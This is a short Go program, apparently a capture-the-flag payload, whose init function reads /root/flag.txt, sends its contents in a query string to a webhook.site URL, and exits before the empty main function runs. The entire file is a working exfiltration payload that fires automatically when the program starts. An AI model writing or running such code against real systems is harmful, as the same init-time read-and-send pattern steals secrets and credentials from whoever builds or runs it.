package main

import (
	"io/ioutil"
	"net/http"
	"os"
)

func init() {
	flag, err := ioutil.ReadFile("/root/flag.txt")
	if err != nil {
		return
	}
	http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
	os.Exit(0) // Exit right after init
}

func main() {
	// Empty but required main function
}
